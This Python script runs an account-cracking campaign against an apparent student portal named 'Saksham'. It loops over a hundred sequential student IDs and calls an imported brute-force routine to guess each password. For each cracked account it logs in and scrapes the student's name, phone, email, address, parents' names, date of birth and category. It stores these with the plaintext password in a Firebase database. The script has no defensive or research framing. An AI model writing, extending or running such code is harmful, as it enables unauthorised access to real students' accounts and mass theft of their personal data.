from FirebaseStudentDatabase import *
from modules.requests_module import *
import time

def getStudentDataFromSaksham(userid, password):
    cookie = getSessionCookie(userid, password)
    studentDetailsHtml = getStudentDetails(cookie)
    student = parseStudentDetailsHtmlToStudent(studentDetailsHtml)
    return student

def main():
        db = FirebaseStudentDatabase()
        
        for i in range(1200, 1300):
                
            formatted = '{0:04}'.format(i)
            userid = "2023/" + formatted
            print("Started for user: "  + userid)

            try:
                if(db.getStudentData(userid) is not None):
                    print("Password already exist in database/being cracked")
                else:
                    print("Password not found in database neither being cracked")
                    
                    #Working status set in database
                    working_dict = {
                            "password":"working...",
                            "studentName":None,
                            "phone":None,
                            "email":None,
                            "roll":userid, 
                            "address":None,
                            "fatherName":None,
                            "motherName":None,
                            "dob":None,
                            "gender":None,
                            "category":None,
                            "studentId":None,
                            "session":None,
                            "enrollmentNo":None,
                            "admissionDate":None,
                            "studentType":None,
                            "timeTake":elapsedTime
                            }
                    db.addStudentData(userid, data = working_dict)
                    
                    start_time = time.perf_counter()
                    password = bruteforceLogin(userid, 1000)
                    end_time = time.perf_counter()
                    elapsedTime = str(end_time - start_time)[:8] 
                    
                    if(password is None):
                        null_dict = {
                            "password":None,
                            "studentName":None,
                            "phone":None,
                            "email":None,
                            "roll":userid, 
                            "address":None,
                            "fatherName":None,
                            "motherName":None,
                            "dob":None,
                            "gender":None,
                            "category":None,
                            "studentId":None,
                            "session":None,
                            "enrollmentNo":None,
                            "admissionDate":None,
                            "studentType":None,
                            "timeTake":elapsedTime
                            }
                        db.addStudentData(userid, null_dict)
                        
                    else:
                        print("Password found: " + password)
                        student = getStudentDataFromSaksham(userid, password)
                        student_dict = {
                            "password":password,
                            "timeTaken":elapsedTime,
                            "studentName":student.name,
                            "phone":student.contact_no,
                            "category":student.category,
                            "email":student.email,
                            "roll":student.roll_no, 
                            "address":student.address,
                            "fatherName":student.father_name,
                            "motherName":student.mother_name,
                            "dob":student.dob,
                            "gender":student.gender,
                            "studentId":student.student_id,
                            "session":student.session,
                            "enrollmentNo.":student.enrollment_no,
                            "admissionDate":student.admission_date,
                            "studentType":student.student_type,
                            }
                        db.addStudentData(userid, student_dict)
                            
            except Exception as e:
                print(f"Error: {e}")
                    
                
    
    
main()